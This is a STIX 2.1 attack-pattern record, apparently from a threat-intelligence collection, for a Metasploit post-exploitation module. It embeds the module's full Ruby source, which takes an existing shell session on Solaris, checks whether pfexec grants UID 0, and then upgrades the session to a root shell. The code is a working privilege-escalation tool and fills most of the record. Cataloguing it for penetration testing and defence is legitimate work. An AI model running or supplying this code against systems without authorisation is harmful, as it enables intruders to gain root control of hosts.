{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c7248da8-93bb-4ac6-adaa-e3c365d3de4d",
    "created": "2024-08-14T16:32:57.990936Z",
    "modified": "2024-08-14T16:32:57.99094Z",
    "name": "Solaris pfexec Upgrade Shell",
    "description": " This module attempts to upgrade a shell session to UID 0 using pfexec.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/solaris/escalate/pfexec.rb",
            "external_id": "pfexec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.oracle.com/cd/E19253-01/816-4557/prbactm-1/index.html"
        },
        {
            "source_name": "reference",
            "url": "http://www.c0t0d0s0.org/archives/4844-Less-known-Solaris-features-pfexec.html"
        },
        {
            "source_name": "reference",
            "url": "http://solaris.wikia.com/wiki/Providing_root_privileges_with_pfexec"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Solaris::System\n  include Msf::Post::Solaris::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Solaris pfexec Upgrade Shell',\n        'Description' => %q{\n          This module attempts to upgrade a shell session to UID 0 using pfexec.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['bcoles'],\n        'Platform' => 'solaris',\n        'References' => [\n          ['URL', 'https://docs.oracle.com/cd/E19253-01/816-4557/prbactm-1/index.html'],\n          ['URL', 'http://www.c0t0d0s0.org/archives/4844-Less-known-Solaris-features-pfexec.html'],\n          ['URL', 'http://solaris.wikia.com/wiki/Providing_root_privileges_with_pfexec']\n        ],\n        'SessionTypes' => ['shell']\n      )\n    )\n    register_options [\n      OptString.new('PFEXEC_PATH', [true, 'Path to pfexec', '/usr/bin/pfexec']),\n      OptString.new('SHELL_PATH', [true, 'Path to shell', '/bin/sh'])\n    ]\n  end\n\n  def shell_path\n    datastore['SHELL_PATH'].to_s\n  end\n\n  def pfexec_path\n    datastore['PFEXEC_PATH'].to_s\n  end\n\n  def run\n    unless session.type == 'shell'\n      fail_with Failure::BadConfig, \"This module is not compatible with #{session.type} sessions\"\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless command_exists? pfexec_path\n      fail_with Failure::NotVulnerable, \"#{pfexec_path} does not exist\"\n    end\n\n    user = cmd_exec('id -un').to_s\n\n    print_status \"Trying pfexec as `#{user}' ...\"\n\n    res = cmd_exec \"#{pfexec_path} #{shell_path} -c id\"\n    vprint_status res\n\n    unless res.include? 'uid=0'\n      fail_with Failure::NotVulnerable, \"User `#{user}' does not have permission to escalate with pfexec\"\n    end\n\n    print_good 'Success! Upgrading session ...'\n\n    cmd_exec \"#{pfexec_path} #{shell_path}\"\n\n    unless is_root?\n      fail_with Failure::NotVulnerable, 'Failed to escalate'\n    end\n\n    print_good 'Success! root shell secured'\n    report_note(\n      host: session,\n      type: 'host.escalation',\n      data: \"User `#{user}' pfexec'ed to a root shell\"\n    )\n  end\nend\n",
    "x_mitre_platforms": [
        "solaris'"
    ]
}